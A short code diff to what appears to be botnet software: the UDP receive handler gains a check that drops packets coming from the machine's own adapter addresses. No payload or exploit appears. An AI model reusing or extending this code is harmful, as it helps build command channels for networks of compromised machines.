@@ -125,7 +125,14 @@ void Communication::HandleIncomingsUDP()
 
 		recvfrom(udp_sock, buf, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&client, &client_size);
 		
-		
+		if ([=]()
+			{
+				for (size_t i = 0; DEC_ADAPTER_IPS_ARR[i].hip; i++)
+					if (DEC_ADAPTER_IPS_ARR[i].hip == client.sin_addr.s_addr)
+						return 1;
+					return 0;
+			}())
+			continue;
 
 		switch (p->type)
 		{
